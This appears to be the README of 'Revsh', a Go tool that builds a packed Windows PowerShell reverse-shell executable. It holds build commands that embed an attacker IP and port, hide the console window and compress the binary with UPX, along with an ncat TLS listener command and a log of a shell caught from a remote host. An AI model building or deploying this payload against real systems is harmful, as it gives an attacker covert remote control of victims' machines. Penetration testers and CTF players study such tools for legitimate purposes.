# Revsh

Simple TCP reverse shell for powershell written in [Go](https://golang.org).

### Building the payload

To simplify things, you can use the provided Makefile.
You can set the following environment variables:

- ``GOOS`` : the target OS
- ``GOARCH`` : the target architecture
- ``LHOST`` : the attacker IP or domain name
- ``LPORT`` : the listener port

For the ``GOOS`` and ``GOARCH`` variables, you can get the allowed values [here](https://golang.org/doc/install/source#environment).

However, some helper targets are available in the ``Makefile``:

- ``depends`` : generate the server certificate (required for the reverse shell)
- ``windows32`` : builds a windows 32 bits executable (PE 32 bits)
- ``windows64`` : builds a windows 64 bits executable (PE 64 bits)

For those targets, you just need to set the ``LHOST`` and ``LPORT`` environment variables.

### Build Example

```bash
$ make LHOST=10.10.14.25 LPORT=8080
rm -f server.key server.pem revsh.exe
openssl req -subj '/CN=acme.com/O=ACME/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
Generating a 4096 bit RSA private key
............................................................................................................................................................................................++++
..............................++++
writing new private key to 'server.key'
-----
cat server.key >> server.pem
GOOS=windows GOARCH=amd64 go build --ldflags "-s -w -X main.connectString=10.10.14.25:8080 -X main.fingerPrint=$(openssl x509 -fingerprint -sha256 -noout -in server.pem | cut -d '=' -f2) -H=windowsgui" -o revsh.exe revsh.go
test -n "`which upx`" -a -x "`which upx`" && upx revsh.exe
                       Ultimate Packer for eXecutables
                             Copyright (C) 1996 - 2013
 UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

         File size         Ratio      Format      Name
    --------------------   ------   -----------   -----------
   2900992 ->    966144   33.30%    win64/pe     revsh.exe

   Packed 1 file.
```

### Basic usage

One can use various tools to handle incomming connections, such as:

* socat
* ncat
* openssl server module

Here is an example with `ncat`:

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 8080
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.10.125.
Ncat: Connection from 10.10.10.125:49954.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> 

```

